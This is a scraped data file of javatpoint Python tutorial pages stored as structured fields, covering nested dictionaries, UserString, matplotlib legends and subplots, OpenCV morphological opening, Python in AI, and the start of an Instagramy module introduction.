5, 3, 6"", 'print(""\\nDictionary after adding 3 elements: "")', 'print(Dict)', ""# Updating existing Key's Value"", ""Dict[2] = 'JavaTpoint'"", 'print(""\\nUpdated key value: "")', 'print(Dict)', '# Adding Nested Key value to Dictionary', ""Dict[5] = {'Nested' :{'5' : 'Java', '3' : 'T'}}"", 'print(""\\n Adding a Nested Key: "")', 'print(Dict)', '# Let us first create a nested dictionary that contains data items with their', '# corresponding key-value pairs in a python programming language.', '# Nested dictionary having the mixed keys', ""Dict = {'Name': 'JavaTpoint', 1: [11, 12, 13]}"", 'print(""\\nDictionary with the use of Mixed Keys: "")', 'print(Dict)', '# Let us first create a nested dictionary that contains data items with their', '# corresponding key-value pairs in a python programming language.', '# Nested dictionary having the same keys', ""Dict = { 'Dict1': {'Name': 'Reena', 'age': '22'},"", ""'Dict2': {'Name': 'Jatin', 'age': '19'}}"", 'print(""\\n Nested dictionary 2-"")', 'print(Dict)', '# Let us first create a nested dictionary that contains data items with their', '# corresponding key-value pairs in a python programming language.', '# Nested dictionary having the mixed keys', ""Dict = { 'Dict1': {1: 'J', 2: 'T', 3: 'P'},"", ""'Dict2': {'Name': 'JTP', 1: [1, 2]} }"", 'print(""\\n Nested dictionary 3-"")', 'print(Dict)', 'Dict3 = { }', 'print(""Initial nested dictionary:-"")', 'print(Dict3)', ""Dict3['Dict1'] = {}"", '# Adding elements one at a time', ""Dict3['Dict1']['name'] = 'Boby'"", ""Dict3['Dict1']['age'] = 21"", 'print(""\\n After adding dictionary Dict1"")', 'print(Dict3)', '# creating a nested dictionary named as student', ""student = {1: {'name': 'Shivam', 'age': '22', 'Id': 10023},"", ""2: {'name': 'Anjali', 'age': '20', 'Id': 10024}}"", 'print(student)', '# creating a nested dictionary named as student and accesing the elements using [] syntax', ""student = {1: {'name': 'Shivam', 'age': '22', 'Id': 10023},"", ""2: {'name': 'Anjali', 'age': '20', 'Id': 10024}}"", ""print(student[1]['name'])"", ""print(student[1]['age'])"", ""print(student[1]['Id'])"", '# creating a nested dictionary named as student and here we are adding one more', '# element in the dictionary', ""student = {1: {'name': 'Shivam', 'age': '22', 'Id': 10053},"", ""2: {'name': 'Anjali', 'age': '20', 'Id': 10004}}"", 'student[3] = {}', ""student[3]['name'] = 'Tina'"", ""student[3]['age'] = '19'"", ""student[3]['Id'] = '10034'"", 'print(student[3])', '# creating a nested dictionary named as student and here we are adding one more', '# element in the dictionary, after than we want to perform delete operation into it', '# for deleting particular elements from a particular dictionary indide the nested', '# dictionary.', ""student = {1: {'name': 'Shivam', 'age': '22', 'Id': 10053},"", ""2: {'name': 'Anjali', 'age': '20', 'Id': 10004}}"", 'student[3] = {}', ""student[3]['name'] = 'Tina'"", ""student[3]['age'] = '19'"", ""student[3]['Id'] = '10034'"", 'print(student[3])', ""del student[3][ 'Id']"", 'print(student[3])', '# creating a nested dictionary named as student and here we are adding one more', '# element in the dictionary, after than we want to perform delete operation into it', '# for deleting particular elements from a particular dictionary inside the nested', '# dictionary.', ""student = {1: {'name': 'Shivam', 'age': '22', 'Id': 10053},"", ""2: {'name': 'Anjali', 'age': '20', 'Id': 10004}}"", 'student[3] = {}', ""student[3]['name'] = 'Tina'"", ""student[3]['age'] = '19'"", ""student[3]['Id'] = '10034'"", 'print(student[3])', 'del student[3]', 'print(student)']","['Printing the dictionary that contains integer keys with their corresponding values', ""{1: 'Rina', 2: 'Gita', 3: 'Sita'}"", 'Simple empty dictionary:', '{ }', 'Nested dictionary are as follows -', ""{'dict1': {}, 'dict2': {}, 'dict3': {}}"", 'Printing the dictionary that contains string keys with their corresponding integer values', ""{'A': 1, 'B': 2, 'C': 3, 'D': 4, 'E': 5}"", 'Dictionary with each item as a pair:', ""{1: 'silk', 2: 'one'}"", 'Dictionary after adding 3 elements:', ""{1: 'Java', 2: 'Tpoint', 3: 1}"", 'Dictionary after adding 3 elements:', ""{'Name': 'JavaTpoint', 1: [11, 12, 13], 'Value': (5, 3, 6)}"", 'Updated key value:', ""{'Name': 'JavaTpoint', 1: [11, 12, 13], 'Value': (5, 3, 6), 2: 'JavaTpoint'}"", 'Adding a Nested Key:', ""{'Name': 'JavaTpoint', 1: [11, 12, 13], 'Value': (5, 3, 6), 2: 'JavaTpoint', 5: {'Nested': {'5': 'Java', '3': 'T'}}}"", 'Dictionary with the use of Mixed Keys:', ""{'Name': 'JavaTpoint', 1: [11, 12, 13]}"", 'Nested dictionary 2-', ""{'Dict1': {'Name': 'Reena', 'age': '22'}, 'Dict2': {'Name': 'Jatin', 'age': '19'}}"", 'Nested dictionary 3-', ""{'Dict1': {1: 'J', 2: 'T', 3: 'P'}, 'Dict2': {'Name': 'JTP', 1: [1, 2]}}"", 'Initial nested dictionary:-', '{}', 'After adding dictionary Dict1', ""{'Dict1': {'name': 'Boby', 'age': 21}}"", ""{1: {'name': 'Shivam', 'age': '22', 'Id': 10023}, 2: {'name': 'Anjali', 'age': '20', 'Id': 10024}}"", 'Shivam', '22', '10023', ""{'name': 'Tina', 'age': '19', 'Id': '10034'}"", ""{'name': 'Tina', 'age': '19', 'Id': '10034'}"", ""{'name': 'Tina', 'age': '19'}"", ""{'name': 'Tina', 'age': '19', 'Id': '10034'}"", ""{1: {'name': 'Shivam', 'age': '22', 'Id': 10053}, 2: {'name': 'Anjali', 'age': '20', 'Id': 10004}}""]",[],"['|||A dictionary is consists of two parts and the first is the data set and the second one of its corresponding key value.|||It also does not allow duplicates in it.|||Here nested dictionary refers to the dictionary inside a dictionary.|||In simple words, it refers to the dictionary, which consists of a set of multiple dictionaries.|||It is used to store the data values in key-value pairs.|||Nesting Dictionary means putting a dictionary inside another dictionary. Nesting is of great use as the kind of information we can model in programs is expanded greatly.|||A nested dictionary contains an unordered collection of various dictionaries.|||Compared with a normal dictionary, it also contains the key and its value pairs.|||We can access the dictionary using its key.|||A Nested dictionary can be created in Python by placing the comma-separated dictionaries enclosed within braces.|||Slicing Nested Dictionary is not possible.|||We can shrink or grow nested dictionaries as needed.|||']"
422,['Collections.UserString in Python'],"[""Strings are the bytes that represent Unicode characters. Characters are strings that are of length one. The problem is that Python doesn't support this data type character.""]","['https://www.javatpoint.com/how-to-customize-legends-with-matplotlib', 'https://www.javatpoint.com/nested-dictionary-in-python', 'https://www.javatpoint.com/how-to-customize-legends-with-matplotlib', 'https://www.javatpoint.com/nested-dictionary-in-python', 'https://www.javatpoint.com/how-to-customize-legends-with-matplotlib']",[],[],"['Collections.UserString', 'Conclusion']",[],[],"['The syntax for UserString is:', 'Example 1: (User dictionary with value and empty)', 'Example 2: Mutable String (Append function and Remove function)', 'In this tutorial, we have discussed how to use UserString function of ""collections"" module in Python.']",[],"['Python provides a String as a container, referred to as UserString, included in the collection module. This class functions as an additional class that wraps around string objects. This class is helpful in the case of creating strings of their own that have been modified or even with new features. It is an option to create new features to the string. This class can be used to take any argument that could be converted into strings and create a simulation of an unstructured string with its contents stored in a regular string. The string can be accessed via its data attribute.']","['# First, we will create a String with a single Quotes', ""String_1 = 'JavaTpoint is the best platform to learn Python'"", 'print(""String with the use of Single Quotes: "")', 'print(String_1)', '# Now, we will create a String with double Quotes', 'String_2 = ""JavaTpoint is the best platform to learn Python""', 'print(""\\n String with the use of Double Quotes: "")', 'print(String_2)', 'collections.UserString(seq)', 'from collections import UserString as US', 'P = 123546', '# Here, we will create an UserDict', 'user_string = US(P)', 'print(""UserString 1: "", user_string.data)', '# Now, we will create an empty UserDict', 'user_string = US("""")', 'print(""UserString : "", user_string.data)', 'from collections import UserString as US', '# Here, we will create a Mutable String', 'class User_string(US):', '# Function to append to string', 'def append(self, s):', 'self.data += s', '', '# Function to remove from string', 'def remove(self, s):', 'self.data = self.data.replace(s, """")', ""# Driver's code"", 's_1 = User_string(""JavaTpoint"")', 'print(""The Original String: "", s_1.data)', '# Here, we will Append to string', 's_1.append(""ing"")', 'print(""String After Appending: "", s_1.data)', '# Here, we will Remove from string', 's_1.remove(""a"")', 'print(""String after Removing: "", s_1.data)']","['String with the use of Single Quotes:', 'JavaTpoint is the best platform to learn Python', 'String with the use of Double Quotes:', 'JavaTpoint is the best platform to learn Python', 'UserString 1:  123546', 'UserString :', 'The Original String:  JavaTpoint', 'String After Appending:  JavaTpointing', 'String after Removing:  JvTpointing']",[],[]
423,['How to Customize Legends with Matplotlib'],"['In this tutorial, we will explain how we can learn to alter the legend of matplotlib. Matplotlib is a well-known software for the visualization of data. This is a graphing library written in Python and has the NumPy extension for numerical computation.']","['https://www.javatpoint.com/matplotlib-legend-in-subplot', 'https://www.javatpoint.com/collections-userstring-in-python', 'https://www.javatpoint.com/matplotlib-legend-in-subplot', 'https://www.javatpoint.com/collections-userstring-in-python', 'https://www.javatpoint.com/matplotlib-legend-in-subplot']","['https://static.javatpoint.com/python/images/how-to-customize-legends-with-matplotlib.png', 'https://static.javatpoint.com/python/images/how-to-customize-legends-with-matplotlib2.png', 'https://static.javatpoint.com/python/images/how-to-customize-legends-with-matplotlib3.png', 'https://static.javatpoint.com/python/images/how-to-customize-legends-with-matplotlib4.png', 'https://static.javatpoint.com/python/images/how-to-customize-legends-with-matplotlib5.png', 'https://static.javatpoint.com/python/images/how-to-customize-legends-with-matplotlib6.png', 'https://static.javatpoint.com/python/images/how-to-customize-legends-with-matplotlib7.png', 'https://static.javatpoint.com/python/images/how-to-customize-legends-with-matplotlib8.png']",[],"['How to Customize the Legend', 'Conclusion']","['Syntax:', 'Location:', 'Font Size:', 'Colour of the Legend', 'Marker Properties:', 'Changing the Looks:', 'Title of the Legend:']",[],"[""First, let's look at how we can create an image legend using matplotlib."", 'Syntax of legend in Matplotlib is:', 'It can be described by the following terms:', 'It is possible to pass it by following the steps:', ""This can be passed as, 'xx-small', 'x-small', 'small', 'medium', 'large', 'x-large', 'xx-large'"", 'In the example above, we can clearly discern which arguments for keywords add which colour in the legend block.', 'Here, if we see the legend box,', 'shadow: This argument creates shadows to the legend.', 'frameon: Gives the frame to the legend.', 'fancybox: Gives smooth edges for the title.', 'framealpha: Provides transparency to the background of the legend.', 'Example 1: For adding shadow and round corners:', 'Example 2: Removing the frame of the legend box:', 'title: It will give title to the legend', 'title_fontize: It will give size to the title.', ""This can be, 'xx-small', 'x-small', 'small', 'medium', 'large', 'x-large', 'xx-large'""]","[""Legends add meaning to graph plots. The addition of the font, place of origin, and so on makes the legend more visible and easily identifiable. Let's take a look at the various programs available to alter the legends for the plots."", 'To improve the look of the legend, we can also alter the size of legend. By connecting the parameter for font dimensions to the operation, we can alter the font size within the legend box in the same way as the plot title.', 'The marker is put first, while the label is put in the second. The markerfirst parameter allows us to alter the location of the marker. If we set it to False, the positions of the marker and labels are swapped.', 'The addition of a title to the legend is crucial to include in the legend boxes. The title parameter can let us create the legend of a title, and the title_size lets us choose a particular fontsize for the name.', 'In this tutorial, we have discussed how we can customize the legend, such as adding the title, shadow, removing the frame, changing font size and colours, etc.']","[""Legend is an area on the graph that describes each element that makes up the. A graph may be straightforward in the sense that it's. If we include titles, labels for X, the Y label, and the legend, it will be clearer. When we look at the names, we are able to determine what the graph represents easily and the type of data it represents."", ""Sometimes the legend could be incorrect or not be placed in the correct spot. Matplotlib lets us specify the place where we would like to put the legend. This way, we can put the legend where it doesn't overshadow the plot. This means that the plots will appear more tidy and clean."", 'Sometimes we think that it would be wonderful to have the legend box coloured to make it look more appealing and help it stand out from plots. Matplotlib can also help by allowing us to change the look of legends by altering the colour of text and background and even the edges that the legend displays.', 'The legend can include some of the fundamental CSS properties such as creating a shadow, putting in frames, and turning the corners, and let us make the legend transparent box if you do not want to obscure those tiny aspects of the plot by the frame.']","['legend(*args, **kwargs)', '# First, we will import the required modules', 'import matplotlib.pyplot as mplot', '# Here, we will plot values', 'P = [2, 4, 3, 6, 5, 1]', 'Q = [6, 12, 19, 21, 10, 2]', '# Now, we will plot using matplotlib', 'mplot.plot(P, label = ""P"")', 'mplot.plot(Q, label = ""Q"")', '# Here, we will create the legend', 'mplot.legend()', 'legend(loc = "")', '# First, we will import the required modules', 'import matplotlib.pyplot as mplot', '# Here, we will plot values', 'P = [2, 4, 3, 6, 5, 1]', 'Q = [6, 12, 19, 21, 10, 2]', '# Now, we will plot using matplotlib', 'mplot.plot(P, label = ""P"")', 'mplot.plot(Q, label = ""Q"")', '# Here, we will create the legend and add the location', ""mplot.legend(loc = 'lower right')"", 'legend(fontsize = "")', '# First, we will import the required modules', 'import matplotlib.pyplot as mplot', '# Here, we will plot values', 'P = [2, 4, 3, 6, 5, 1]', 'Q = [6, 12, 19, 21, 10, 2]', '# Now, we will plot using matplotlib', 'mplot.plot(P, label = ""P"")', 'mplot.plot(Q, label = ""Q"")', '# Here, we will create the legend and adjusting its fontsize.', ""mplot.legend(fontsize = 'x-large', loc = 'upper left')"", 'legend(labelcolor = "")', 'legend(facecolor = "")', 'legend(edgecolor="")', '# First, we will import the required modules', 'import matplotlib.pyplot as mplot', '# Here, we will plot values', 'P = [2, 4, 3, 6, 5, 1]', 'Q = [6, 12, 19, 21, 10, 2]', '# Now, we will plot using matplotlib', 'mplot.plot(P, label = ""P"")', 'mplot.plot(Q, label = ""Q"")', '# Here, we will create the legend and add the colour to it:', ""mplot.legend(labelcolor = 'Pink', facecolor = 'blue',"", ""edgecolor = 'Brown', fontsize = 'xx-large')"", 'legend(markerfirst = bool, default: True)', '# First, we will import the required modules', 'import matplotlib.pyplot as mplot', '# Here, we will plot values', 'P = [2, 4, 3, 6, 5, 1]', 'Q = [6, 12, 19, 21, 10, 2]', '# Now, we will plot using matplotlib', 'mplot.plot(P, label = ""P"")', 'mplot.plot(Q, label = ""Q"")', '# Here, we will create the legend', 'mplot.legend(markerfirst = False)', '# First, we will import the required modules', 'import matplotlib.pyplot as mplot', '# Here, we will plot values', 'P = [2, 4, 3, 6, 5, 1]', 'Q = [6, 12, 19, 21, 10, 2]', '# Now, we will plot using matplotlib', 'mplot.plot(P, label = ""P"")', 'mplot.plot(Q, label = ""Q"")', '#Here, we will create the legend and adding shadow and fancybox to the legend', 'mplot.legend(shadow = True, fancybox = True)', '# First, we will import the required modules', 'import matplotlib.pyplot as mplot', '# Here, we will plot values', 'P = [2, 4, 3, 6, 5, 1]', 'Q = [6, 12, 19, 21, 10, 2]', '# Now, we will plot using matplotlib', 'mplot.plot(P, label = ""P"")', 'mplot.plot(Q, label = ""Q"")', '#Here, we will create the legend and removing frame', 'mplot.legend(frameon = False)', 'legend(title= """" , title_fontsize = """")', '# First, we will import the required modules', 'import matplotlib.pyplot as mplot', '# Here, we will plot values', 'P = [2, 4, 3, 6, 5, 1]', 'Q = [6, 12, 19, 21, 10, 2]', '# Now, we will plot using matplotlib', 'mplot.plot(P, label = ""P"")', 'mplot.plot(Q, label = ""Q"")', '#Here, we will create the legend and give title and fontsize:', 'mplot.legend(title = ""Legend"", title_fontsize = \'xx-large\')']",[],[],"['|||legend(): legend() automatically determines the elements to display. It accomplishes this by showing every plot that has been marked with the keyword argument ""label.|||legend(labels): The name of the X and the name of Y, which is shown in the legend|||legend(handles and labels): The list of line numbers to add to the legend. Combining labels and handles gives you complete control over what information should be included within the legend. It is recommended that the lengths of both legend as well as handles should be equal.||||||""upper left"", ""upper right"", ""lower left"", ""lower right"": It is located in the appropriate area of the plot.|||""upper-center"", ""lower center"", ""center left"", ""center right"": It is located at the edge that is in the middle of it.|||""center"": It is situated in the exact middle of the map.|||""Best"": It is not placed with the cross-over of artists.||||||labelcolor: is used for changing the colour of the text.||||||facecolor: is used for changing the background colour of the legend||||||edgecolor: is used for changing the edge colour of the legend|||']"
424,['Matplotlib legend in subplot'],"['In this tutorial, we will learn how Matplotlib can be used to include legends in subplots. The legend can be added after creating the plot using the legend() function.']","['https://www.javatpoint.com/morphological-operations-in-image-processing-in-python', 'https://www.javatpoint.com/how-to-customize-legends-with-matplotlib', 'https://www.javatpoint.com/morphological-operations-in-image-processing-in-python', 'https://www.javatpoint.com/how-to-customize-legends-with-matplotlib', 'https://www.javatpoint.com/morphological-operations-in-image-processing-in-python']","['https://static.javatpoint.com/python/images/matplotlib-legend-in-subplot.png', 'https://static.javatpoint.com/python/images/matplotlib-legend-in-subplot2.png', 'https://static.javatpoint.com/python/images/matplotlib-legend-in-subplot3.png']",[],"['Approaches:', 'Conclusion']","['Syntax:', 'Example 1:', 'Example 2:', 'Example 3:']",[],"['The syntax for legend in subplot is:', 'where, loc is used for location.', 'Following are the approaches we will use for displaying legend in the subplot in Matplotlib:', 'In this example, we will plot the scatter graph using subplot of log10 and exponential:', 'In this example, we will plot the scatter graph using subplot of sine and cos:', 'In this example, we will plot the scatter graph using subplot of (y = x^2) and (y = x^3):', 'In this tutorial, we have discussed how to use legend in the subplot of matplotlib graphs using different methods.']",[],[],"[""axes[position].legend(loc = '')"", '# First, we will import the required modules', 'from matplotlib import pyplot as PPlt', 'import numpy as nmp', '# here we will assign the value to x axis', 'x_axis1 = nmp.arange(2, 22, 1.5)', '# Now, we will get the value of log10', 'y_axis_log10_1 = nmp.log10(x_axis)', '# then, we will get the value of exponential', 'y_axix_exp1 = nmp.exp(x_axis)', '# Here, we will create subplots by using subplot() function', 'fig, axes = PPlt.subplots(2)', '# now, we will depicte the visualization', 'axes[0].plot(x_axis1, y_axis_log10_1, color = \'Red\', label = ""log10"")', 'axes[1].plot(x_axis1, y_axix_exp1, color = \'Pink\', label = ""exponential"")', '# Here, we will select the position at which legend to be added', ""axes[0].legend(loc = 'best')"", ""axes[1].legend(loc = 'best')"", '# At last, we will display the plot', 'PPlt.show()', '# First, we will import the required modules', 'from matplotlib import pyplot as PPlt', 'import numpy as nmp', '# here we will assign the value to x axis', 'x_axis1 = nmp.arange(-2, 3, 0.5)', '# Now, we will get the value of sine', 'y_axis_sine1 = nmp.sin(x_axis)', '# Now, we will get the value of cos', 'y_axix_cose1 = nmp.cos(x_axis)', '# Here, we will create subplots by using subplot() function', 'fig, axes = PPlt.subplots(2)', '# now, we will depicte the visualization', 'axes[0].scatter(x_axis1, y_axis_sine1, color = \'Red\', marker = \'*\', label = ""sine"")', 'axes[1].scatter(x_axis1, y_axix_cose1, color = \'Black\', marker = \'*\', label = ""cos"")', '# Here, we will select the position at which legend to be added', ""axes[0].legend(loc = 'best')"", ""axes[1].legend(loc = 'best')"", '# At last, we will display the plot', 'PPlt.show()', '# First, we will import the required modules', 'from matplotlib import pyplot as PPlt', '# here we will assign value to x axis', 'x_axis = list(range(-15, 15))', '# here, we will get the value of x * x', 'y_axis_1 = [x * x for x in x_axis]', '# here, we will get the value of x * x * x', 'y_axix_2 = [x * x * x for x in x_axis]', '# Now, we will create subplots by using subplot() function', 'fig, axes = PPlt.subplots(2)', '# Now, we will depicte the visualization', 'axes[0].scatter(x_axis, y_axis_1, color = \'Blue\', marker = \'*\', label = ""y = x ^ 2"")', 'axes[1].scatter(x_axis, y_axix_2, color = \'Brown\', marker = \'*\', label = ""y = x ^ 3"")', '# Here, we will select the position at which legend to be added', ""axes[0].legend(loc = 'upper center')"", ""axes[1].legend(loc = 'upper left')"", '# At last, we will display the plot', 'PPlt.show()']",[],[],"['|||First, we will use the subplots() function for creating subplots in a bigger plot.|||Then, we will use the legend() function for adding a label to the curves.|||At last, we will show the plots by using the show()|||']"
425,['Morphological Operations in Image Processing in Python'],"['Morphological operations can be used for extracting image components that are helpful for the description and representation of the shape of a region. Morphological operations are the fundamental tasks that are dependent on the image shape. It typically takes place on binary images. It requires two sources of data, the first of which is an input image, and the second is known as the structuring component.']","['https://www.javatpoint.com/role-of-python-in-artificial-intelligence', 'https://www.javatpoint.com/matplotlib-legend-in-subplot', 'https://www.javatpoint.com/role-of-python-in-artificial-intelligence', 'https://www.javatpoint.com/matplotlib-legend-in-subplot', 'https://www.javatpoint.com/role-of-python-in-artificial-intelligence']","['https://static.javatpoint.com/python/images/morphological-operations-in-image-processing-in-python.png', 'https://static.javatpoint.com/python/images/morphological-operations-in-image-processing-in-python2.png', 'https://static.javatpoint.com/python/images/morphological-operations-in-image-processing-in-python3.png', 'https://static.javatpoint.com/python/images/morphological-operations-in-image-processing-in-python4.png']",[],[],['Required modules and libraries:'],[],"['The Opening is an erosion operation that is followed by dilation.', 'To perform the morphological operation in the image processing, we will need the following module:', 'Install: !pip3 install cv2', 'Install: !pip3 install numpy', 'Syntax of cv2morphology is:', 'Parameters:', 'Here below is the Python code for explaining Opening Morphological Operation -', 'Input image', 'Output Frame']",['The system recognizes the designated blue book as the input and removes and eliminates the noise inside the area of interest with the aid of the Opening function.'],"['Morphological operators are able to take an input image as well as the structuring component as input. The two elements are then combined with set operators. The objects of the image input are treated based on the characteristics of the shape of the image. These can be encoded by the structuring part.', 'The Opening is similar to erosion, as it removes bright foreground pixels from the edges of the foreground pixels. The result of this operation is to secure the foreground region, which is similar to the structuring component or even completely contains the structuring component while taking away all other regions in the foreground of pixels. The opening operation is utilized for the removal of internal noise within an image.']","['cv2.morphologyEx(image, cv2.MORPH_OPEN, kernel)', '# First, we will import the required libraries:', 'import cv2 as CV', 'import numpy as nmp', '# here, it will return video from the first webcam on our computer.', 'screenRead1 = CV.VideoCapture(0)', '# now, it will loop runs if capturing has been initialized.', 'while(1):', '# now, it is reading frames from a camera', '_, image = screenRead1.read()', '# Converting to HSV color space because OCV only reads colors as BGR', '# and the frame is converted to hsv', 'hsv = CV.cvtColor(image, CV.COLOR_BGR2HSV)', '# here, we will define the range of masking', 'blue_1 = nmp.array([111, 52, 52])', 'blue_2 = n,p.array([131, 257, 257])', '# Now, we will initialize the mask forconvoluting over input image', 'mask = CV.inRange(hsv, blue_1, blue_2)', '# then, we will pass the bitwise_and over each pixel convoluted', 'res = CV.bitwise_and(image, image, mask = mask)', '# Here, we will define the kernel that is Structuring element', 'kernel = nmp.ones((5, 5), nmp.uint8)', '# Now, we will define the opening function over the image and structuring   # element', 'opening = CV.morphologyEx(mask, CV.MORPH_OPEN, kernel)', '# The mask and opening operation is shown in the window', ""CV.imshow('Mask', mask)"", ""CV.imshow('Opening', opening)"", ""# Now, it will wait for 'a' key to stop the program"", ""if CV.waitKey(1) & 0xFF == ord('a'):"", 'break', '# De-allocate any associated memory usage', 'CV.destroyAllWindows()', '# At last, we will close the window and Release webcam', 'screenRead.release()']",[],[],['|||image: It takes input Image array.|||MORPH_OPEN: It is used for applying the Morphological Opening operation.|||kernel: It is used for structuring element.|||']
426,['Role of Python in Artificial Intelligence'],"['Python is among the most widely used programming languages that developers use in the present. Guido Van Rossum created it in 1991, and since its beginning, it has been among the most popular languages alongside C++, Java, and others.']","['https://www.javatpoint.com/python-instagramy-module', 'https://www.javatpoint.com/morphological-operations-in-image-processing-in-python', 'https://www.javatpoint.com/python-instagramy-module', 'https://www.javatpoint.com/morphological-operations-in-image-processing-in-python', 'https://www.javatpoint.com/python-instagramy-module']",['https://static.javatpoint.com/python/images/role-of-python-in-artificial-intelligence.jpg'],[],"['Features and Advantages of Python', 'Artificial Intelligence and Python: Why?', 'Decoding Python alongside Artificial Intelligence', 'Python Libraries for General Artificial Intelligence', 'Python for Machine Language (ML)', 'Python Libraries for Natural Language & Text Processing', 'Python over Other Popular Languages', 'Conclusion']",['Python vs. C++ for Artificial Intelligence'],[],"['Python is also considered to be a general-purpose programming language, which means that it is able to be utilized across technology and domains.', 'Python is accessible for every Operating system and has an open-source offering called CPython that is gaining huge popularity.', ""Let's now consider the ways in which using Python to create Artificial Inelegance provides us with an advantage over other programming languages."", 'Python and other programs such as NumPy Sciencekit-Learn iPython Notebook and matplotlib provide the basis for starting the AI project.', ""Let's look at the reason Python is used in Machine Learning and the various libraries it provides for this reason."", ""Let's now look at where Python compares to other languages that are used for Artificial Intelligence, such as C++ and Java.""]","[""Python has taken a large lead in our quest to determine the best programming language for AI or neural networks. Let's look at the reasons Artificial Intelligence with Python is among the most exciting ideas in the world."", 'Python also comes with a dynamic type system and automatic memory management that support various programming techniques, such as object-oriented, functional, imperative, and procedural, to mention just only a few.', 'Python is the simplest language of all the programming languages, and in reality, is one-fifth when compared with other OOP languages. This is why it is currently among the most well-known languages in the marketplace.', 'NumPy is used to store generalized data, which consists of one N-dimensional array and tools to integrate C/C++ codes, Fourier transformation, random numbers capabilities, and many other functions.', 'Another library to look into is pandas, an open-source library that provides users with data structures that are simple to use and analytical instruments that work with Python.', 'Matplotlib is a different service that is a plotting library for 2D producing high-quality publications. Matplotlib can be used to access up to six graphical users interface tools, Web application servers as well as Python scripts.', ""Let's look more deeply into the different Python libraries that are used for AI and the reasons why this programming language is utilized to create AI."", 'This is why it is clear that Python is the top AI Programming Language in the world. Alongside being the top AI programming language, Python has value for various other goals.']","[""Python can be described as an Interpreted language, which is, in simple terms, implies that it doesn't require compilation into machine language instruction prior to execution, and it is able to be utilized by the programmer directly to execute the program. This makes it a sufficient language to be used using an emulator or a virtual machine that is based on an existing machine's native code that is the language that hardware can understand."", 'It is a High-Level Programming language that is employed in complex scenarios. High-level languages handle arrays, variables, objects, and complex arithmetic, Boolean expressions, as well as other abstract concepts in computer science in order to be more complete and thereby increase their use.', 'The next step is to investigate k-means clustering. You can find out the basics of decision trees. Continuous numerical prediction, logistic regression, and much more. The most frequently used Python AI libraries are AIMA, pyDatalog, SimpleAI, EasyAi, and others. There are numerous Python machine learning libraries, such as PyBrain, MDP, scikit, PyML.', 'Compared to C++ and Python in terms of syntax, Python has the advantage and is better suited for AI. With its easy syntax and readability, it can facilitate speedy testing of advanced machine learning algorithms as well as an active community, aided by tools for collaboration such as Jupyter Notebooks and Google Colab. Python wins the prize.', 'Python is a key part of AI programming languages due to the fact that it has good frameworks, such as scikit-learn-Machine Learning in Python that meets almost all requirements in this area as well as D3.js data-driven documents JS. It is among the most efficient and user-friendly tools to visualize.', ""In addition to frameworks, Java's speedy prototyping makes Java an important language that shouldn't be missed. AI requires a lot of studies, which is why it is not necessary to have a 500-KB boilerplate for Java to test an innovative idea, but it will never be able to complete the project. In Python, nearly every concept is easily validated with twenty to thirty lines of code (same as JS using libraries). This makes it an extremely useful language to aid in the development of AI.""]",[],[],[],"['|||Python comes with Prebuilt Libraries such as Numpy to perform scientific calculations, Scipy for advanced computing, and Pybrain for machine learning (Python Machine Learning), making it among the top languages for AI.|||Python developers all over the globe offer extensive support and assistance through tutorials and forums, helping the programmer much easier than another popular language.|||Python is platform-independent and therefore is among the most adaptable and well-known options for various platforms and technologies, with minimal modifications to the basics of coding.|||Python has the greatest flexibility among other programs, with the option of choosing among OOPs method and scripting. Additionally, you can use the IDE to search for all codes and be a blessing to developers struggling with different algorithms.||||||AIMA - Python algorithm implementation comes directly from Russell as well as Norvig\'s ""Artificial intelligence: A Modern Methodology. ""|||pyDatalog - Logic Programming engine in Python|||SimpleAI - Python implementation of various artificial intelligence algorithms explained in ""Artificial Intelligence, a Modern Approach "". Its primary goal is to provide intuitive, well-documented, and tested libraries.|||EasyAI - A simple Python engine that allows two players to play games using AI (Negamax and transposition tables for Game-solving).||||||PyBrain - is an easy yet flexible algorithm to perform Machine Learning tasks. It also functions as an extensible Machine Learning Library for Python that provides a range of predefined environments for testing and evaluating algorithms.|||PyML - A bidirectional framework developed in Python concentrates on SVMs and other kernel-based approaches. It\'s accessible on Linux and Mac OS X.|||Scikit-learn - can be described as an effective instrument for data analysis making use of Python. This is a completely free and open-source library. It is the most widely used general-purpose machine learning library.|||MDP - Toolkit A different Python Data Processing Framework that is easily extended contains a variety of unsupervised and supervised learning algorithms and other computing units for data analysis that could be combined to create sequences of data processing and more intricate feed-forward networks. Implementation of the new algorithm is straightforward. The number of algorithms available is constantly growing. It includes signal processing techniques (Principal Component Analysis, Independent Component Analysis as well as slow Feature Analysis), manifold methods of learning ([Hessian Locally Linear embedding) as well as a number of classification methods, probabilistic techniques (Factor Analysis, RBM), and data pre-processing techniques, and many more.||||||NTLK - Open-source Python modules Documentation and linguistic data to conduct study and research in natural text processing and analytics. There is software that works with Windows, Mac OSX, and Linux.||||||Python is a more well-known programming language than C++ for AI and has a lead with a 57% majority vote from developers. This is due to the fact that Python is simple to master and use. With its numerous libraries, it is also able to be used to analyze data.|||Performance-wise, C++ outperforms Python. This is due to the fact that C++ has the benefit of being a statically-typed language, which means there aren\'t any typing errors at running. C++ also creates smaller and faster runtime code.|||Python is an active (as opposed being static) language that reduces the complexity in collaborating so that you can create functions with fewer lines of code. Contrary to C++, where the majority of compilers perform specific optimizations and be specific to a particular platform, Python code can be executed on almost every platform without having to rely on it to set up particular configurations.|||The rise of GPU-accelerated computing provides capabilities for parallelism, which resulted in the development of libraries like CuDNN and CUDA. Python, as well as cuDNN, Python has the advantage against C++. This means that increasing amounts of computation required in machine learning applications are transferred to GPUs. The results are that whatever performance benefit you might think C++ may have is becoming more and more irrelevant.|||Python is superior to C++ regarding the simplicity of programming, particularly among novice developers. C++ is a lower-level language, requires more experience and knowledge to master.|||Python\'s syntax is easy to understand and makes it easier to use a natural and easy ETL (Extract Transform, Load, and Extract) process. This means it\'s quicker to develop as compared with C++, allowing developers to evaluate machine learning techniques without the need to develop them in a hurry.|||']"
427,['Python Instagramy Module'],"[""Instagram is the most popular social media platform in today's time, with billions of users, are present there. In the current time, Instagram is not only the place where one can share their pictures with others but can utilize this platform for their own advantage. One can use Instagram as a platform for connecting with others, creating reach for business, promoting brands through Instagram profiles (pages), getting an audience for start-ups, and for many other functions. All this become possible because of the increasing popularity and multiple new features of Instagram. With time, Instagram has introduced many new features for their users, such as the Direct Message option, Business page option (which comes with a lot of features), Reels option (Where one can promote their page or product short videos), etc. Now, this is about Instagram, but if we talk from a developer's perspective, we would love to know that is there anything we as a developer can do on Instagram by writing programs. The answer is Yes! We can do many interesting things on Instagram and fetch information from Instagram by writing the programs. Many programming languages offer us packages and using functions of these packages in the program; we can do many interesting tasks on 